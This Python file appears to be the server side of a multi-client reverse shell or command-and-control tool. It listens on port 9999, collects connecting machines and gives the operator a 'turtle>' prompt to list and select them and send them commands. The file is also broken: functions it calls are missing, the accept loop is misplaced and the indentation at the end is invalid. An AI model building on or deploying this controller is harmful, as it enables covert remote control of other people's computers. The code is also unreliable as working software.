import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connection = []
all_address= []
#create a scoket
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s=socket.socket()

    except socket.error as msg:
        print('socket creation error' + str(msg))


#binding the socket and the listening  for connection
def bind_socket():
    try:
        global host
        global port
        global s

        print('binding the port ' + str(port))

        s.bind((host,port))
 #now its listening using this s.listen(X), this x represents number of bad connections after which it will throw error and then move to exception side
        s.listen(5)
    except socket.error as msg:
         print('error in socket binding'+ str(msg) +'\n' + 'retrying')
         bind_socket()

#establishing a connection with a client (above s.listen must be there for continous listening
#handeling connections from multiple clients and saving to the list
#closing prevous connection when server.py file is restarted

def accepting_connection():
    for c in all_connection:
        c.close()

        del all_connection[:] #deletes the contents of all_connection
        del all_address[:]


        while True:
            try:
                conn,address=s.accept()
                s.setblocking(1) #prevents timeout
                all_connection.append(conn)
                all_address.append(address)

                print('connection is established'+ address[0])
            except:
                print('error accepting connection')
# 2nd thread function -1) see all the clients 2) selecting a client 3) send command to the connected client
#interactive promt for sending commands


def start_turtle():
    cmd= input('turtle> ')#will take input like turtle> {input is here without braces}
    if cmd == 'list':
        list_connection()

    elif 'select' in cmd:
        conn = get_target(cmd)
        if conn is not None: # checking if input isnt empty
            send_target_commands(conn)
    else:
        print('command not recognized')


#display all current actibve connections
def list_connection():
    results=''
    for i,conn in enumerate(all_connection): #for selecting id i increases by one every loop using enumerate
        #checking is connection is connected or not

        try:
            conn.send(str.encode(''))
            conn.recv(201480)
        except:
            del all_connection[i]
            del all_address[i]
            continue

         results = str(i) + "  " + str(all_address[i][0])+ '  ' + str(all_address[i][1])
     print('---clients---' + '\n'+ results)